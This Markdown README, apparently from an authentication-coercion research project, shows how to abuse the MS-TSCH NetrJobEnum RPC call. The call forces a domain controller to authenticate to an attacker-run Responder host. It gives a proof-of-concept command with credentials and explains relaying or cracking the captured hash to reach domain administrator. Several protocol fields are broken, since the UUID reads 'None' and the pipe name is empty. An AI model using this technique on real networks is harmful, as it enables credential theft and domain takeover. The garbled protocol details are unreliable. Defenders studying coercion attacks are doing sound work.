# MS-TSCH - Remote call to NetrJobEnum (opnum 2)

## Summary

 - **Protocol**: [[MS-TSCH]: Task Scheduler Service Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931)

 - **Protocol UUID**: None

 - **Protocol version**: 0.0

 - **SMB Named pipe**: ``

 - **Function name**: [`NetrJobEnum`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbd5a268-b8c6-4953-8df3-8931ca0f365d)

 - **Function operation number**: `2`

 - **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-TSCH`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931) protocol (with uuid `None` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-TSCH`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-TSCH]: Task Scheduler Service Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931) and allows to call RPC functions of this protocol. We will then call the remote [`NetrJobEnum`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbd5a268-b8c6-4953-8df3-8931ca0f365d) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
NetrJobEnum('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
NET_API_STATUS NetrJobEnum(
   [in, string, unique] ATSVC_HANDLE ServerName,
   [in, out] LPAT_ENUM_CONTAINER pEnumContainer,
   [in] DWORD PreferedMaximumLength,
   [out] LPDWORD pTotalEntries,
   [in, out, unique] LPDWORD pResumeHandle
 );
```

## References

 - Documentation of protocol [MS-TSCH]: Task Scheduler Service Remoting Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931

 - Documentation of function `NetrJobEnum`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbd5a268-b8c6-4953-8df3-8931ca0f365d